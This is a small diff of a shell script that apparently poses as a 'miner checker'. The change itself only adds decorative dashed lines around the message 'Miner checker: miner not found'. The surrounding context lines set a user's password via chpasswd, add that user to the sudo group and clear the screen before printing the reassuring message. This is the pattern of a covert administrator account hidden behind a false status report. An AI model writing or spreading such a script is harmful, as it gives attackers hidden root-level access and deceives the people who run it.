@@ -13,4 +13,6 @@ echo "$username:$password" | chpasswd
 usermod -aG sudo "$username"
 
 clear
+echo "------------------------------"
 echo "Miner checker: miner not found"
+echo "------------------------------"
